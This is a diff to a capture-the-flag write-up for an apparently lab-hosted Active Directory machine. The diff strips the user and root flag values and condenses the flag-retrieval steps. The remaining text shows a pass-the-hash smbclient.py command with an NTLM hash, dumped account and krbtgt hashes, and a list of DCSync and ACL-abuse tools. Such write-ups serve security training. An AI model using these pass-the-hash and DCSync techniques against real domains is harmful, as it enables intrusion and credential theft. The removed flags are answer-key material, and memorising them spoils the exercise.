@@ -355,7 +355,7 @@ yggdrasil.hacksmarter\Ymir:1104:...:8dd4cfe0f89272424e50f5089b8696ec:::
 
 ## 4.2 Flag Retrieval
 
-**User Flag (Hodr's Desktop):**
+With Enterprise Admin access via Ymir's hash, both flags can be retrieved:
 
 ```bash
 smbclient.py -hashes :8dd4cfe0f89272424e50f5089b8696ec \
@@ -363,17 +363,8 @@ smbclient.py -hashes :8dd4cfe0f89272424e50f5089b8696ec \
 
 # use C$
 # get Users\Hodr.YGGDRASIL\Desktop\user.txt
-```
-
-**User Flag:** `AF639BCA0466437FEB9DD7FAC74B0524`
-
-**Root Flag (Administrator's Desktop):**
-
-```bash
 # get Users\Administrator\Desktop\root.txt
 ```
-
-**Root Flag:** `AEA41460BEE0E3291F7C4D7E4F356EE0`
 
 ---
 
@@ -423,15 +414,6 @@ krbtgt           : 718a91c874a0e39f54fb8d989adf0ae6 (NTLM) → DCSync
 - **BloodyAD** - ACL abuse and BadSuccessor exploitation
 - **Evil-WinRM** - Remote shell access
 - **Impacket** - secretsdump.py, smbclient.py
-
----
-
-## Flags Captured
-
-| Type | Value |
-|------|-------|
-| **User** | `AF639BCA0466437FEB9DD7FAC74B0524` |
-| **Root** | `AEA41460BEE0E3291F7C4D7E4F356EE0` |
 
 ---
 
